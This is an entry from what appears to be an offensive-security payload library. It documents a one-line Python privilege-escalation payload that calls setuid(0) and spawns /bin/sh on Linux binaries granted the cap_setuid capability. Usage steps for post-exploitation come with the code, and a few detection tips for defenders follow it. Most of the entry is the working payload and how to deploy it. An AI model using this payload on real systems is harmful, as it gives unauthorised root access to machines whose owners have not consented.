---
id: 6a6040d0-01d9-4be3-9ded-046eff6ab8db
name: Python-Setuid-Root-Shell
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:18.915300+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - privesc
  - payload
validated: true
---

# Python-Setuid-Root-Shell

## Code

```python
import os; os.setuid(0); os.system("/bin/sh")
```

## Description

This Python code snippet sets the effective user ID to 0 (root) using os.setuid and spawns an interactive /bin/sh shell. It exploits binaries with cap_setuid+ep capability to achieve privilege escalation without traditional setuid binaries.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; hardcoded to setuid(0) and spawn sh | N/A |

## Usage

Execute via python2.7 -c '...' after confirming the binary has cap_setuid+ep. Ideal in Linux post-exploitation for gaining root from a low-priv shell. Set up a listener if needed for stability, but this spawns a local root shell.

## Detection

- Monitor Python processes spawning root shells via procmon or auditd.
- Log capability usage and anomalous UID changes in process trees.
- Enable Python logging or syscall tracing for os.setuid calls.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Capabilities]]
